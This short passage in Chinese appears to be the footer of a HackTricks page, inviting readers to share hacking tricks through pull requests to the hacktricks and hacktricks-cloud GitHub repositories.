* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>
